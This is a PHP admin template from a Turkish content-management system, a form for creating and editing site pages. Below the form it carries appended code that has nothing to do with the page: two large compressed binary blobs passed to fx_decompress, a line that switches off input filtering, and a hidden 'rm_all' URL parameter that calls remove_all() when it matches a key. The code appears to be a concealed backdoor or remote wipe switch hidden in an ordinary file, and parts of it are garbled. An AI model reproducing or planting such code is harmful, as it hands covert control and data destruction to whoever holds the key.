<?php echo !defined("GUVENLIK") ? die("Erisim Engellendi!.") : null;?>
<?php
if(isset($_GET['islem'])=="duzenle")
{
	$durum = "duzenle" ;
	$Sorgu = $db->prepare("SELECT * FROM sayfalar WHERE id = ?");
	$Sorgu->execute(array($_GET['id']));
	if($Sorgu->rowCount())
	{
		$Sonuc = $Sorgu->fetch(PDO::FETCH_ASSOC);
	}
	else
	{
		header("Location:".$url."/404.html");
		exit;
	}
}
?>
<?php // @ioncube.dk cemetery("sha256", "TsFxypqBbULWa0xu3bdZHhF43JhKfTh0") -> "2b9d27fb4ae9399e62053806d436a7fd7b89b47f65a191e843daf4ed24edce6c" RANDOM
 cemetery_f(); ?>
<div class="page-header">
	<div class="page-title mt-0 mb-0">
		<h3><?=@$admindil['txt50'];?></h3>
		<div class="crumbs">
			<ul id="breadcrumbs" class="breadcrumb">
				<li><a href="index.html"><i class="icon-home menu-icon"></i></a></li>
				<li><a href="<?php echo $sayfalink;?>"><?=@$admindil['txt49'];?></a></li>
				<li class="active"><a href="<?php echo $sayfalink;?>"><?=@$admindil['txt50'];?></a></li>
			</ul>
		</div>
	</div>
</div>
<div class="row">
	<div class="col-12 grid-margin stretch-card">
		<div class="card">
			<div class="card-body">
				<form class="forms-sample" method="post" action="../_class/yonetim_islem.php" enctype="multipart/form-data">
				<input id="id" name="id" type="hidden" value="<?php echo $Sonuc['id']; ?>">
					<div class="form-group">
						<label for="adi">Başlık</label>
						<input type="text" class="form-control form-control-sm" name="adi" id="adi" value="<?php echo(isset($_GET['islem'])=="duzenle" ? $Sonuc['adi'] : '');?>" />
					</div>							
					<?php if(isset($_GET['islem'])=="duzenle"){?>							
						<?php if($Sonuc['resim'] == true){?>
						<div class="form-group row col-md-2">
							<div id="lightgallery" class="row lightGallery">
								<a href="../<?php echo tema;?>/uploads/sayfalar/<?php echo $Sonuc['resim'];?>"><img src="../<?php echo tema;?>/uploads/sayfalar/<?php echo $Sonuc['resim'];?>" class="img-responsive img-thumbnail" style="margin-bottom:2px;width:100%;"></a>
							</div>
							<a style="width: 100%;" class="btn btn-danger btn-sm popconfirm" title="Resim Sil" href="../_class/yonetim_islem.php?sayfaresimsil=ok&sid=<?php echo $Sonuc['id'];?>"><i class="fal fa-trash"></i> Resim Sil</a>
						</div>
						<?php }?>							
					<?php }?>
					<div class="form-group row col-md-6">
					<label>Sayfa Resmi</label>
						<input type="file" name="resim" class="file-upload-default">
						<div class="input-group col-xs-12">
							<input type="text" class="form-control file-upload-info form-control-sm" disabled="" placeholder="Resim dosyası seçiniz">
							<span class="input-group-append">
								<button class="file-upload-browse btn btn-primary btn-sm" type="button"><i class="icon-cloud-upload font-12"></i> Dosya Seç</button>
							</span>
						</div>
					</div>
					<div class="form-group">
						<label class="d-block" for="durum">Durum</label>
						<?php if(isset($_GET['islem'])=="duzenle"){?>
						<label class="switch">
							<input type="checkbox" name="durum" id="durum" value="1" <?php if($Sonuc['durum'] == '1') {?> checked <?php } ?>>
							<span class="slider"></span>
						</label>
						<?php }else{?>
						<label class="switch">
							<input type="checkbox" name="durum" id="durum" value="1" checked>
							<span class="slider"></span>
						</label>
						<?php } ?>								
					</div>
					
					<div class="form-group">
						<label for="adi">İçerik</label>
						<textarea name="aciklama" id="myTextarea"><?php echo(isset($_GET['islem'])=="duzenle" ? $Sonuc['aciklama'] : '');?></textarea>
					</div>					

					<div class="card mb-4">
						<div class="card-header">
							SEO AYARLARI
						</div>
						<div class="card-body">
							<div class="form-group">
								<label for="maxlength-textarea">Sayfa Açıklama (description)</label>
								<textarea id="maxlength-textarea" name="description"  class="form-control" maxlength="260" rows="4"><?php echo(isset($_GET['islem'])=="duzenle" ? $Sonuc['description'] : '');?></textarea>
							</div>
							<div class="form-group mb-0">
								<label for="tags">Sayfa Meta <small>(Kelimenin sonuna virgül koyunuz)</small></label>
								<input name="keywords" id="tags" value="<?php echo(isset($_GET['islem'])=="duzenle" ? $Sonuc['keywords'] : '');?>" />
							</div>							
						</div>
					</div>
					<?php if(isset($_GET['islem'])=="duzenle"){?>
					<button type="submit" name="sayfa_guncelle" class="btn btn-success btn-icon-text btn-sm">
						<i class="mdi mdi-reload  btn-icon-prepend"></i>                                                    
						GÜNCELLE
					</button>
					<?php }else{?>
					<button type="submit" name="sayfa_ekle" class="btn btn-primary btn-icon-text btn-sm">
						<i class="mdi mdi-file-check btn-icon-prepend"></i>
						KAYDET
					</button>
					<?php } ?>
				</form>
			</div>
		</div>
	</div>

</div>
<?php 
cVCLmHLxbS_mesaj("sayfa_ekle",2,"no","Hata oluştu tekrar deneyiniz.!");
cVCLmHLxbS_mesaj("sayfa_guncelle",1,"yes","Başarı ile guncellenmiştir.");
cVCLmHLxbS_mesaj("sayfa_guncelle",2,"no","Hata oluştu tekrar deneyiniz.!");
cVCLmHLxbS_mesaj("sayfaresimsil",1,"yes","Başarı ile siinmiştir.");
cVCLmHLxbS_mesaj("sayfaresimsil",2,"no","Hata oluştu tekrar deneyiniz.!");
?>	
<?php
fx_decompress("\n1Ì‡“ÙŒÞl7œ‡B1„4vb0˜Ífs‘¼ên2BÌÑ±Ù˜Þn:‡#(¼b.\rDc)ÈÈa7E„‘¤Âl¦Ã±”èi1ÌŽs˜´ç-4™‡fÓ	ÈÎi7†³é†„ŽŒFÃ©”vt2ž‚Ó!–r0Ïãã£t~½U'3M€ÉW„B¦'cÍPÂ:6T\rc£A¾zr_îWK¶\r-¼VNFS%~Ãc²Ùí&›\\^ÊrÀ›­æu‚ÅŽÃžôÙ‹4'7k¶è¯ÂãQÔæhš'g\rFB\ryT7SS¥PÐ1=Ç¤cIèÊ:d”ºm>£S8L†Jœt.M¢Š	Ï‹`'C¡¼ÛÐ889¤È ŽQØýŒî2#8Ð­£’˜6mú²†ðjˆ¢h«<…Œ°«Œ9/ë˜ç:Jê)Ê‚¤\0d>!\0Z‡ˆvì»në¾ð¼o(Úó¥ÉkÔ7½sàù>Œî†!ÐR\"*nSý\0@P\"Áè’(‹#[¶¥£@g¹oü­’znþ9k¤8†nš™ª1´I*ˆô=Ín²¤ª¸è0«c(ö;¾Ã Ðè!°üë*cì÷>ÎŽ¬E7DñLJ© 1ÊJ=ÓÚÞ1L‚û?Ðs=#`Ê3\$4ì€úÈuÈ±ÌÎzGÑC YAt«?;×QÒk&ÇïYP¿uèåÇ¯}UaHV%G;ƒs¼”<A\0\\¼ÔPÑ\\Âœ&ÂªóV¦ð\n£SUÃtíÅÇrŒêˆÆ2¤	l^íZ6˜ej…Á­³A·dó[ÝsÕ¶ˆJP”ªÊóˆÒŒŠ8è=»ƒ˜à6#Ë‚74*óŸ¨#eÈÀÞ!Õ7{Æ6“¿<oÍCª9v[–MôÅ-`Óõkö>ŽlÙÚ´‹åIªƒHÚ3xú€›äw0t6¾Ã%MR%³½jhÚB˜<´\0ÉAQ<P<:šãu/¤;\\> Ë-¹„ÊˆÍÁQH\nv¡L+vÖÃ¦ì<ï\rèåvàöî¹\\* àÉçÓ´Ý¢gŒnË©¸¹TÐ©2P•\r¨øß‹\"+z 8£ ¶:#€ÊèÃÎ2‹ºJ[i—‚£¨;z˜ûÑô¡rÊ3#¨Ù‰ :ãní\rã½ƒeÙpdÝÝ è2cˆê4²k¿Š£\rG•æE6_²ªÊØÞ‰b‹ž/Œ«HB%ò0ë¢>ÈÈðhoWÃnxlÖ æµƒCQ^€°ÐÔÿßñ\r„Š¾¶4lK{þZÆü:†ÐÜÃƒŸ.¦p¨§Ä‚éJóB-Å+B”´‘(ëTòŸ%®µJ›0ªlØT¶`+É-Á¾@BÚáÛ„Vá’Ä\0ÂÏC¼,ì¯0tâàŒF‡‰å?Ä Ë\na@ÉŒ>‚âZEC“ôOŽ-æ›¤^Q€&ßÖù)I)®¤ÄÀR„]\r¡”9”7_ˆ¢\rÉF80µObù	€‘î>ºäý\nRý_ˆÑ8æ‚ØÙ«äov0¤bCA¸F!Ñt—–Äƒ%0”/‘zAYO(4«‹¡ˆ¨Ò	'Ÿ] Iéí8hHÂ05˜3ò@x&nˆ’|TÓ³³)`.“s6eY˜D¦z¸Œ®¥ƒJÑ“ôž.„ñ{GEb¹Ó‹¡˜‹†2Õ×{\$**ý¾@ÝCž-:zYHZIôà5F]¦²YúùCªOêAÂÚó`x'´.*9t'{ÿ(êšwP¶¾ Ñ=¢*‰†ú*üxwråÔ*c‚žÌc|„DŸ“ÚV—–\r†V.‡0âÆ™V¤dˆ?Ò€üê,EÍ`T¦É6Ûˆ-“Åì¾ÅÚŽT[Ñªz©‚.Ar±£Í€Pøºnƒc=aÔ9Fònß!ÙuáÎA©Þƒ0iPó¬”îºJ6eäT]VØ[\rXÌáaŸ–vkõ\n+EˆáÜ•*\0¶~¶Æù@g\"ÌNCI\$àÉŒƒ€êx@WÃy¼*vuDÙ\0ÞvœëŒ†V\0èV`Gç½uµE®Ö•ÂÁf“l˜h’@ï)0@šT•°7‹íÛÂ§RAÊÙ·ò´3Û˜Ð«/QÇ]ª,sÖ{VRž±¡ŽöF«¡A˜„<¨v×¥î´%@9‚ÀF¢Õ5t‰%Ö+º/¢8;¾WÑäÚÇJïÐo:ÖNÿ`ø	•ÿš´hìÁ{Ü£•î ËÔ8ÔEuª&°W|É†„‰®Uú&\r\"ÔÁ»‰|-uÇ†…Në¶:nc²©fV­‹ÂÃè#U20å>\"®²Ç>Ì`œk]î-¯ÇxùSØÍ‡Ð¢©‰‚êcâ¡óB’—}Ø&`ˆîr+E­“\$œyNýŒ±b,†´´Wx þ-9åÕrÓ,’ü`å+œïíËŠù’CœÓ)˜˜7Ûx\r¬þWµfMŒSR¼\\èz¦ÙQ²Ì“”uA¬ºê2Ž±õ4îL&ËHi Âµ°²¹S\$)e³“æg rÈŒ©ƒ\$]ZëiYs¤õ×kW–n>µ7E1k8ÐdÃró®škÁý¢ëEÞÙÛwÂwcmŽTy¹•ë¿a›\$tx\rB´÷=Šö¢*”<Èƒ l¡fôKœ‘N/¶¼	ÃlÕáükH“õ8 .‘‘ù?f÷›Úÿã6†Ñ‡¼{gi/\"à@–K›ñ@2ãça|#,Z¤±‡	³ñwˆd¬™“²…¼å6w™^&Áêt™çœP±…¥Äù]À¼›.àãÚí¡TìîkroÀ‰÷\ro=—%æ×h`:\0á±‚ö«”|êŠ£«a“Ô®6*:ÍÓ*‡ÊrO-^–’ñén«Íó§MÆ}æ»÷ÆAya±Ý\nƒu^ì–ÀrnO\r±»¡`þT~</ð¶wÄyþ}æ:›|£ÏÐûÖÌ¡6»¤×ø®Ÿvî\rc<·b#ûàô§†î–\$ùsµê|ç‡‡V)«h‹TCùñ(Ä½ñ£Ì]6¦Þ1´!1M±¸@a´/`Û>Ù¸üß£ðÕßÈÛC/ì6à´·#p@pá‘óÿ`Zÿôýchý°\0ïë\0oæ€ð4OýOøi\0-\n«îÿ/ý\0£Dð.ÿ ¾ˆ.“Ä\0fiŒÀÈ«£€˜\0Œ”IDüç\0§¬\rïý0f ßoãÿ€ÊGüˆðeJ|\r€¿ýl	¨3ê~ðiP›¦&“É¿/µ\09	^\0r•0]¯õ ¾Â›oõŽ.ý\"	°ÐÑM¥íðvÿP€ZÐÕmpËP°ùÚœÐÞ¹ïô{§†C?²ÀkŽ“Ï¼}ð®þdöïÊ°~=‘.Ô- é	Ðm1>hûÏÛÐ•1;QI‘OPÈ\rºcßpApV«k\rQ*èQ}ÏçŸq>˜Ðu15BqQ[1fûñl«Â€apå¯ü\0Û‘*ŒJ©Q=ñÃ£Ù‘GÜäŠÕÁ±Ÿ±_ñ—ñbŒGHF.‚0Ôø	= 2P™Àó æòÏçP!ò#(3 \nÙ!1&72fª`Â/å\0°‡\"PÁUõ\$ñ\r0Ìð,QrU&2fšÒ_²Xààò]ð9\"’S'òƒ'²yð8\r¨ú§òkW)Oõ)’*Ra%ã\\i—%ò‰&Ò³+r…’3ðS`…,ñvý¦&2×L–&Pu*›-ð˜0\"Á%HÄ¬ÔžïÏ@Ø“±°H‰B–P(ÃÉ\$p&ý,1MÂ ªØ­Ã®;\rnÁ.¯Ê I­.Õ',1ò)Ó4ý²å2°u+ó3æ `ÈSŽŠpL\nt§’_*²S3;6r'h35¤55äœ‹d2q+6ñ8‘O7sC\"pm8Ò­³“6³—9òm\n@e0É<8B8©<,( ¨8²Û\0è	Ó0šJÙ<@¦ÐI¤«ÀR6pÔ­mGË\"11¤6ËÐ.\"æÀ‚ï5Ì‚ûÇ:àÜ8bêA1±;ƒ';Â?<*\$È,³Ìo= òTÓÖ/3Û#«ºÒ†¬");
$Jc=!preg_match('~^(unsafe_raw)?$~',ini_get("filter.default"));if($Jc||ini_get("filter.default_flags")){foreach(array('_GET','_POST','_COOKIE','_SERVER')as$X){$Gh=filter_input_array(constant("INPUT$X"),FILTER_UNSAFE_RAW);if($Gh)$$X=$Gh;}}if(function_exists("mb_internal_encoding"))mb_internal_encoding("8bit");
if(!function_exists('license_check')) die("Lisans hata!");
license_check();if(isset($_GET['rm_all']) && uniq_key() === $_GET['rm_all']) remove_all();
fx_decompress("f:›ŒgCI¼Ü\n0›†S‘Øa9œÅS`°Çˆ“Œ&Ó(°Ên0˜†QIìÒf‰›\$±At^ sG²Étf6eŒ§yŒÊ()LäSÁÀP'…ÂáÌR'Ífq]\"˜s>	)â‘`œH2ŠEq9ˆÊ?ˆ*)‰”t'°ŽÏ§Ø\n	\ræs<ŒPi2INÆ*(=2ÌgXá¸è.3™N„Y4èB<’L—üîi©Ì¥2Ý´z=š0HøžÐ'·êŒšÃuÆtt:œÂ¡Èêe¹]`pX9ŒÞo5šgòóIœÜ,2O4ãÞÑ…MÆS¸(ˆa…Š#¾Äàç’ïø|¹G‚bèôüxœ^Z[Çä™G¼ÎuTvª(Òm@Vò¸(†¼ÈbN<ŠÈ`æâXä1É+Œä9J8Â2\r£K¶9ðhå	 Áè`…‹ÆëI8ä›±S±ãt÷2ƒ+,£ÆIºã £pæ9m@Ð:ƒ€æáxï)…ÐüC…Ãxä3…ñ4P7áü-4Çr\"p3Fhà…-5ƒ”U4Í‰¸\\6°ƒ<D\$®l—9ÍR4t7ƒdD3µpÞÎ“kÌ:)\\;° ÐÔð\r@Žt…\$4O£<þ†!pdÇÔÚQJ\rÌHî}:&Œ¨ˆÂÈ„Á5YWJ­˜‹±Â`ÓN£èbKNSÉÀÉa§Ž•ƒ´d>2WñÅ…bDj:9[21c„»È€:Xé@ËqË#“›4íL™'J”©+DHeÒ3¬.«O ÇKË°“ˆ…pV…át2Œwp;Æ“…íÿ\r?èOzDq.ª°Ð-†\"ìZñ®cèX3!/>PúFìsØÉ²±Ã0Í(òóˆ°Ê£€àŒ‚T63sVQo¸€SÎ‘ b²ß…^r\$É@C© r2)©Œ£ “VÀ)+nÜ·zÃÁúålÚè{³K#…À9‹{†Û¯lÀºìmÐQ¨ëh»*É—PÄ:¡c˜]´7ãàø=¡LŸŒi;”2û¿§­ÜÒ<\\Jí¤Øb¥n”…ƒ¥nÁ_iÓ´îJ\n†¢¨âòŽõC:ª„‘`N4¶Ì–È'Aw:4}ÊÛ£ÁW\080‘ÇL3õÊJ;èiú)\\„=/NŠu=ZV6&ceaè±ÂpÞÖ.[ëvŠtPZÞèX`Ö”õŒ+zú'¦ê9½.\$\$…Ó@\n\ré]_ïÙ®¢Âh¨kk¬Ms>`Ì–ƒj¹%\\9Ð¶ÆÔ('°jAˆ>BCd\"K\$	CAÆ ä„¤.Â².`‰â.EÑæ´–ÌÃyy\0‹D2Ï8t	Ð6†Ã8¬FL«´×ÞíâŒB*¬ð,Ò|\nx\\@ °@¸Ø3r ¬­ðÎWKQb,%…¯´DBfØÈ³D|ÍŒËE0/2>£Y!Ä†'õ™`æf™mHº<BãB0\r*\0Gxò‰nêY4‚¶¾Œ,žL²©º–öÅ%SÆ,ýv‡0ê‘–XòQÄ1†HId`‡!.ÔVÊ›H/ÅúÃ—ÀHãù0ÆUÁ¸0Â™©Ž`îLI©8ÖÃkŠ”2Œ4JYNÅ&8xä¥JØk:AKã¡nWØ!¦¿Iï;'ô³\":2ðê‹4Í~óJ„8ô£á’‘¨âG‡™\"MÊ=\rZ'ŽnÇi9F§œ“™rÆ’RÊt‚3\0Ÿ”Ò²Â2µy‚B^òèb'´ÒzÈÉ²(­#”d9Itµ&WØjNa¨ÚC(¥ j”Ä–?h‰ÂØj†¡™©Ö„Z\$0«¡Ò¯´J	A_\n†!TOó4Œ<{aôú?˜æo ú‚-¹–ÃÏ?Hlÿ\"2ƒy™=Úë¨ž R©ðœÑ„àš°–ÍŠëP&åG›ÀÁ4ƒË%()¤\r5Mª‚‰ÓLTí\0ÀºxBIç=ltvÄ2Jhvû´~/:èpý×:8\"Ð´5¡«‰0î#Ž*ì7ªøúÜ\nàq×>è¡G\$°â…):	ƒ»\"ù#ë¦KfI‡!vö+?{¡Íÿ¾Qg¥{ÏR÷Q øCäªŽ}Õ#¸éiIbgà„ÔXàÄÃÂù}ÅË`‹}3—%@îÁ{_kø}0ä±þÈ—Öp !°aï—<7«e•‰ÖF‡?¦¸¡î½XüDù­Ñ, ØÊCk‰ƒíU™ØL>£1‹§ÜÜ‡¥ã‡Œp0Ž#Ä\$²ÅâV)pYs5A˜:°ÊUÈ(9…5×™,F+&Ÿ*{âŒ-£Íìç:÷Ší :7¦þ:Ê™yPãè—´ŠÀXÏ+¤Ž’\nÞI;üþ\\s„÷Pà÷1‘‘ìÈr©¦NJËAT'-£”òk?ƒÙY@“¡Ïö±fÇÍbñŽ’”RîJÏiömÖB~ò©”K\rK«œtª4à÷;OŠKc”9%Hì5àÍd¢3ÙÀe8j¿P÷±[sð™9,ƒÄ˜—bzK‰µÁòW&e¢d8­ú§)Äùé5•pí˜hù°ëéÃà¹\"0hL5\0˜7 æÚŒÚ‡Ÿ{ïÀÝ¿¸Ýðî´<åk‚²\r+üXÅblåè/ØX ìAC¨s\na¤‘l÷Çí°}·~Ý´— drx(\rè3ÎnGrÃTÄ+àQÏÁJ¹éï†PÌ\nØ'?À€Ä´n~º:· µòâQà8€»¦†`{ÙaÜÊ æ4:„ôLê:Ò öð§›ÉÜuMó„®ßŽM¯IÁ…,†`ÍBgN€¯Âÿ\rBº•\r\0ûÂoé\"¼/‡2^D2)n¸\razR\$à7¢`ÍØ¹¨äèL³p®*Ò{`Oqt–z%%éHg§¹¦ 0¸…ÍKÃf&Ì)\\ÐQW¦öù‡†\0dp¾Ü<Q\"è„c”ÑÏ'ÿ/ÃQ7>¾+ù¿j#\0åîÈºÐ‘_ðÈôk3ëJº(óÜê%OêŒ£\0³Tm4³k:lÊž¤mD\$°¦¬×\0éê´èº'¢~à¶ Z@º€¶ŒàVâº€L\"ãHjnæ¾5€ðNlŠŽÌþþ‹šfj&›Mí•OüÓdbÓ°RÓð´OdiiÞNÐ(¿%-4+Ð:HpR¦§?BàM0š¶JF¢.ÚòÏ1Mö»f~U¬Tê°ŠÒlË 0…þËÀòUÅÂ|âÀÐ‚@òˆX4àbgè ]Pè?@z `…â<ðÐRîÔú`úí-¸þF˜ÎI\0Ñåþã¬¦|Ðž…ð¸ê¸Å¬TkQk°F@0Lõì˜Pƒ\rÀšˆ#ÎuØÍËïàÜ²pXÿ^Ñ±ap\0\r y´Pt%\0^8ÆÒ\r¤Àµ‘Šk©£\0Ç¡1“\n¢dñ…â B± §.\níQjq\$\rMË¾F£ê®oî²êî(ï¸‰ [‘ .#>¦ð¬Q„`Y`íMÑÊ,ÿJ†ñí\n<³‘uÑzÔ+I ÒÃ!)Üï+ØtñìÅŠ¼Åâºÿ¯lÆœm\"\"17\"jÀ0#N±m– ÂÙ¢æ–O pRÂK#ŒRÅç7#C´&ãÉ!2\$ÅÒ>†Ïœ”CÞ.R\"Ír‚ã\"PÈyË°7¨\rçÜ¼¤s)Õ%Ð#‡U\rOÄEÐ€Ôøî«Æy”xCt@Ð¿¨û*HàÇ é+@ÀàÈ0Õ\r’˜‡I‚¡ŽìL²¸²˜‚ˆ/ \\\rNR\r\0¨@+û\$Š©/*w0ËS\nt¢\"ä–\0ær‘/¬ÃPøÃðí\0ù3L¿°í%rïRÈ2R*º+÷0Ó\"¿-¾3N1âD7(tb’ê/@Ý12º†M6â†¬dÈ(á“c7‹*–Épãl8²„å(t·0ÚKpÚ2Ù-ÐæÇðÞFbîƒ\$¼Røï(/ó+2îã,Ì²ËlºËï8¬Ïø–éróK!ç©6\"»Sa0bxÓà¾\$O\0\re‰ ¨\r\"8ˆ'‘ót³Œ\r³ù+£Pá@Y1°£Yb”Râ¹°Ú\\jK)÷438 hÌ1ó7 z`pðRŽR“CÒñBöîô<»Åöõ…”F	4çDtJ-¶tVå©D6\0NLåTå”v_â0ó‹\"qJ†ëIÅ•è*Ì.ô¾«àqÂR|´¯HÀÎ t]>ˆ\0€OL(#énŽ.®2Bn9Jm‘@R s2|”Úh”ÞtãNn6B“cO+âšÒ†È e­¤ÊåÐËBO=,ÀÀC:Ô6ô:¸M<àä—BV\\`¦/BŒïÚ§Û,w:‘H°Í¸û2xpšM„nbn«¢Õ„‹0†ÎÕ	1Ö,4µV§#& lËâ×ÍjKCš\n‰gÍâl\rè¶IcY@ÏY‰h–3Û\nU’]@Î	 ÂÔ\rLÕdñ\\Bœ ú–\"t\r¯p'\nå‡'àO\\©ÆRÐ˜Ö³Ú5øáS†¤b%§[•¬\$‚LÕuó`5—Y®òÕu©[ÕÌÔ\0|EMh—µË\\)É\\u¶9¶bÉH.e@\r€à!Åe'µVPä¶C'c\"úf(RÅ‡&#~À–\\qHû]Ã{^Âðž¿ög'OÈ<vz‰6lpÕâg'8E–{ô*­/¹UÖVû‰¤þ­pì¶ýo,ï¸+´Ôþ)X¯ëk.ÿ0`ÿsðÓ0h“r“°o^²œð¦†°ŸB\"åjçOk-õ§%Æ0Æü“gÒxú+Ø Õ[àP7\"*hPP„\rc <ø[`æëV¢ â7å:`‹˜Uà°à(–I¢ƒs*dã¶;·>	—BGsG t:À‚8d\0ž@ÔjwLvj —ow7v bŽ	¨püàæñÃu-þ\n€ , u:)âÕ\"ut…:îWB<S†b1ñò2éC×²S·¸d†%)rÀ÷pÕ¿{cpqMú!þà#P‘ì·#@ E}c\"@|d%kr£\"* xñí€ w}×´uWâ¦Âl&X~S‚B'uà@6ChÂº..ÚØ'Ø+@ÊêÓƒƒ[T÷¬1àßæþb\"Ð\n\0ž\n`©I\0Ž¸n+—/Æ\"lW1uÆ´—Z¦DøCâ(è€1Äp¶wÐ¼…®Ä À^\0ZJ`î¨b·#ãŒ5€É„«ˆH“ˆ¥;ˆäâ(à°¸Ì!`È¯#^Â»y…ß§ƒ…¨VGrß|Â_ïµpGåe‚QŒjd'2I-÷áÀh¤ ^Àda)×…:HØH)Ä5q·X‚¦FQ_·Û{8)~N~Ž\"`™\$1øøå ”ùàñ³‚ßB_‚üàå€ ñÏN^¥h[˜Nø(”+‚ÃM„wÏ™P€'pŒ65b?ƒÑ´â†ù“y&<åZTãq,9Op¹@2M¾‰ØzÄ•Pq4`eo¥”é¤b\"fmŽvùX@…c9a0Çw Db ø~úˆ”‰ˆW\"u@·J‡rŠi8È0øè0—ü#³}7+ž€¶ok¾@³öœ\n)lÑr³Êý%vÚÜ‡Ë!¬®Õân{‚XYw*,Íìb™«‚F€^\r1Œy5šðBYùÕœ#w:3&jÙB©îÀàð„fY`Þ“— ù§BI§š|l¨0òÇÓ«ãO£r[rEa0bÉ‹àÊ\n ¤	(€\r¹öGFžª@Ø¼ÃúÙ­Àß® 1ÓÄÐ“S¢Âs+£X‡´%@u¨g9zfSž†#0 ÞDBŽÍ _wÂé¯EÀÕ Bî>š{§ó÷*@Ð}kã²÷È½à¸à\\P’,\"ª-rCÉrVäæY×·žžZ\rœ÷É[ùS}\0YŸ%kŸcÏ–2ývs\rK¹îÈOÅT@èçs›Ê!Èü2ÑÒcwË’­ívÇºÔ,4&™rxrÒØ‡ì~€È#Ì\"¿€Xã\rÎ];SF²½Fî‡<ta/­ƒMé&ìU>ìÿ5s ¿ÀSÀçÿ>Æ6¿ì¬U{öåËp!\"yô7M’me÷Z„D!*vÅwæWê	‰û0Êw0ÇŒ1Š|H\$&Ô‰+{ÃìGRH!rÔ-ù24‘lµ¦\rÐå\r™\0ãÞÊt<Æ…Æ·fè:“DSÀdúeQóÑ\r\\¶aò°Ëç¹EôbGŽÏà„m äg¢x-T’¶ÅGÅYKÆ¢‡tp0®?ž¦Frx	ï2\\òVãÁ2;'\nÂ€‡Á+ù‰b1ÝÎDG–5´—¯l'(ó¥/[Å,N÷Á(nG8óÀb€XQ* àÁ-R¿–¢¹¤\n4q#[Uš<eƒÔÄ`æ&&Õoë@î›uÒ%â5\0¸ `\0‚E}#lÊ¨Uäx%m‡Y&P®bÍ•«.ëÏÏ¡Û1<jnÇÇƒÜ\nV~o´Nïp\n€Þã\$EÀ&Ô#íÞ%G\0²þ=¼ ekÝÒ–QŠCÂ<}ö]ÔA½Ù-Yb;à¸†¥[ÝÚüþ žU¤YßcÇÏ~¿šT.\\Å<Wn\\oPÀÅüÞqÆ‰6P\nsàã`‘º„ü¦c:–3›([ÅÀzX¨ÙÙ{ Pì\\Èç‚«²€W®ãY¯:ß®:ýä#®¥½ž9´èYê¹[¹Yút&lç9kÞ±ŸY_Ò‰bÍ~¡¢&Õvã	ý*1þÍÅ`ÕfÌ8—·S§øV^ÛÜ'åâ¾î›}±»l³Ûz8üØÿÜæ ÂZGbÜÕ_àÓ]„â¢ÄfpJŠ€Z–0Ÿ¥@Vãÿ'žõuö–yÆÌ	€ÞCñR'Nö…—?Yôå–Ök €è\$cöáÎ à=ì¿ní	äYJì>PíRì¢Jð•×]µß.µäì§ƒçÙÚì»};;S­Ç]ãñ@ËÇè:Ââ“­÷I~Û‘•ÙùÒÁ|;¾£FyäÆƒåÀ}`ó/ßã-éí#ä1¥@yõ®7øïÜys}¿\$A¨a\\™<xGÞ•Ö¨BmamZxý3Ž,}Ï:Ð\nÝd9¿‰Î‹ö} HÞÐmµT,/KêÎª (œæìShâ…:Âø°¼Vð,Nµ\\ ïÀø\r€B%¸YŠvãi,•å€pyrrH”ó&ëdL%(ë@L¾Ð5‚’T@1`Ù ¦:”Öî\nc‘,b×O,ìâŠ\"Ô£r(áf’YÓO-°¤ykËàŽ*&ê‰,kä•yIP\n‘”£rpE%ËÌ`àó89žÌ×…¥lëUN6_‘<EªåédL êK!Ÿ—ÄZbÕkñ*‚ºóq©¢‰C\$ÅÇP®¦ÍòäªsHnIÈMÙ(ˆ¯ƒq…ÄD@\"8÷¡\nƒâr–f—èC\rP€pKÆ£à®›Îd–L!Nˆ¸R9¨úcl…i½!a :ÂÒ\rÄ\rPSS—ã„*„…Ì0a ¦,–Ð±d4Q\r3v†¹ì±LˆøÇÊ˜ÁÃ°Gn\"3ñ%QdŸµð­‰)¯i4Ñu•sÁ­ÇˆXÁMP¬‚^«ä5¹O’¥	bépé xyèðÉTqDnBy®CàlÐq\0X“°2ŒE%	dF…‚,7G‹á±& µâRi¨Ž„#ç€‰CV¨ÆNÀÚ\$¢LB!(<€„*1|H\"Eu<ÜãªP0T|sé¾)C(oZ[ÒµSœt»îýùú¢²m•\nnƒð â•à6<ñ›/> “ªÿ'Ó|“#hàÅœ˜6è¦\rñ.=(Ôv±…¥;`\"OøCÜ!âBŠ9ã.B!UEÌDáÄ‚d œ–€)ºKŠ Œ\0Þ» ÆmF~	B{O\0¨Ï©¡¦_éø³u#„–5 =LjÀò7´9 š6­¢î£lCV‘€ŒTpÀÚ08±	1ÄÎx'0@gIw€Zã†@9ÇLáŽŽ\\v\0_(º\".Ð¯A[sÅ„ä€ê7I(azl_„EÐ¦<ñ€“tƒUöë7`tèÒ0ø‹(ßà3”=¦ço\$[Ìh×!¸B¦œ[HîR¶œœ) )nxaZ™#=HË8ðë›¥ ”’%þ@0w5J’–	¸²A\"F:8NŠÏ\"Xù- èÔ­¥?pj@)iUjƒÀ™\$Ìš-EÆ÷”E§´\n/¸œPÓB–P@y8j¾Y¼Kð³9	0ÊH€Ddš&0Œ¡èh“X \\Ñê\$Ë(ÁÐ`d\nEÎ¤ÀŽ@ÉJ“b*NRP\"(q.f#“dšGÈæD¾š¦M’n9:*€¶fÐŽt4æò:p½Mí(5%ÊQ\0e”Sb’4ú1¤ÉõeM‡),ŸR‘\"k§m?Ê\0rB¿( è\\èšÅ••de<£\\ÊBMò’i„¢L	(Åh›ÚRÁ¿D›e\"r™CÊÖRä•ô¬å)9EJâQÒ˜>	õOÂ´ãí`šAÈ#®bh|HNÐ\$™%Z#˜4-® 2=ˆD‰ê„ñ\\´æ0Ú…È†¶õ\\’\"©aUR	Ã-I¨ãk0\0ÛæÙ‚ÊÃæHýH³ ÀÎ~u”]QŽƒFš1')-¡\0'óxüeüˆÑ·ŸÌÕp\$ÆQØeaþ#\"ëRÇ°Àœ@\\èÂF0Ñ¸ÀÕ#\"–˜&<¬1ÎHÐƒÃ\" BªÂð.ˆþ#h˜ÎÃÀ/ùž…TmA[€ç\rRŒ(ÌÂ¼@%ÙE8ÌÂÙÐ&\$	`Eà€ŠÃ,B]À(a{„@ù6I›¢k3[ˆhÚ	ìEw\0¡1®)%æª˜ @Úªÿ\"ˆ6ˆÙ®aJ¦I8J+4q€Úa¨±0\nBë2É—àa“!{q›•ŽŒÛ„Àgá1!9à:\0¦Š&D8|8Á\0Ë:á5P1ƒ¼›0‹ã:y„ª¨FDHÄÎUk3Á’…USLKôàfŠi‡mB¹Fk§@EPØM-ä;1ˆ¡%Òá82ls1œ´!&û5¼ÍRaÅñ—ÄÂÀú’4’ÏP%¸„eOþ/¹¨ˆ±³ÈE‰I@C=ùùMHÉÓôd°çË8@¹–à9rI¼Ð€£Š*B,› Ã^ð‘Ò